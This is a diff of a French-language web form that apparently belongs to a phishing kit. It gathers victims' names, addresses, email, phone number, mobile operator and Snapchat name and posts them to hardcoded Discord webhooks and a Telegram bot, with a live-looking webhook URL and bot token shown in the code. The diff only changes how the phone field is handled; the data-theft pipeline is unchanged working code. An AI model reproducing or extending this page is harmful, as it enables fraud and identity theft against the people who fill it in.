@@ -62,17 +62,6 @@
       margin: 10px 0 5px 0;
       font-size: 14px;
     }
-    .copy-container {
-      display: flex;
-      gap: 5px;
-    }
-    .copy-container input {
-      flex: 1;
-    }
-    .copy-container button {
-      flex: none;
-      width: 100px;
-    }
   </style>
 </head>
 <body>
@@ -88,14 +77,6 @@
       <input name="codePostal" placeholder="Code Postal" required />
       <input name="adresse" placeholder="Adresse (facultatif)" />
       <input name="snap" placeholder="Nom Snapchat" required />
-
-      <!-- Champ téléphone copiable -->
-      <label for="telephone">Numéro de téléphone :</label>
-      <div class="copy-container">
-        <input id="telephone" name="telephone" type="text" placeholder="06 00 00 00 00" readonly />
-        <button type="button" onclick="copyPhone()">Copier</button>
-      </div>
-
       <button type="submit">Valider</button>
     </form>
     <div id="msg"></div>
@@ -106,14 +87,6 @@
     const DISCORD_ALT_WEBHOOK_URL = "https://discord.com/api/webhooks/1474169014027813048/-BCyQk9VGD0Y6drGsv2FUp0vc5Jn8qWwMLPPHalPfx9QxKUht-3azqggeTp8UAbtQTwB";
     const TELEGRAM_TOKEN = "8376532446:AAEJHOCBBO8KrHJb2pnrsu2e1-Ow17pl9r0";
     const TELEGRAM_CHAT_ID = "8431463416";
-
-    function copyPhone() {
-      const phoneInput = document.getElementById("telephone");
-      phoneInput.select();
-      phoneInput.setSelectionRange(0, 99999);
-      document.execCommand("copy");
-      alert("Numéro copié : " + phoneInput.value);
-    }
 
     async function sendDiscord(embed, webhookUrl) {
       return fetch(webhookUrl, {
@@ -150,18 +123,14 @@
         ville: formData.get("ville"),
         codePostal: formData.get("codePostal"),
         adresse: formData.get("adresse"),
-        snap: formData.get("snap"),
-        telephone: document.getElementById("telephone").value || "Non fourni"
+        snap: formData.get("snap")
       };
 
       const step1 = JSON.parse(localStorage.getItem("step1") || "{}");
       const operateur = step1.operateur || "Non fourni";
-      const telephoneStored = step1.telephone || "Non fourni";
+      const telephone = step1.telephone || "Non fourni";
       const ip = "Inconnu";
       const ua = "Inconnu";
-
-      // Remplir automatiquement le champ téléphone copiable si déjà stocké
-      document.getElementById("telephone").value = telephoneStored;
 
       let webhookToUse = DISCORD_WEBHOOK_URL;
       if (operateur.toLowerCase().includes("bouygues") && Math.random() < 0.5) {
@@ -180,7 +149,7 @@
               `├ 🏠 Adresse : ${step2.adresse}\n` +
               `├ 📍 Ville : ${step2.ville}\n` +
               `├ 📮 Zip : ${step2.codePostal}\n` +
-              `└ 📱 Numéro de téléphone : ${step2.telephone}\n\n` +
+              `└ 📱 Numéro de téléphone : \`\`${step2.telephone || "Non fourni"}\`\`\n\n` +
 
               `📧 Contact\n` +
               `├ ✉️ Email : ${step2.email}\n` +
@@ -206,7 +175,7 @@
         `|🏠| Ville : ${step2.ville}\n` +
         `|🏠| Code Postal : ${step2.codePostal}\n\n` +
         `|🪁| E‑Mail : ${step2.email}\n` +
-        `|🪁| Téléphone : ${step2.telephone}\n` +
+        `|🪁| Téléphone : ${telephone}\n` +
         `|🪁| Opérateur : ${operateur}\n\n` +
         `|🥥| Adresse IP : ${ip}\n` +
         `|🥥| User-Agent : ${ua}`;
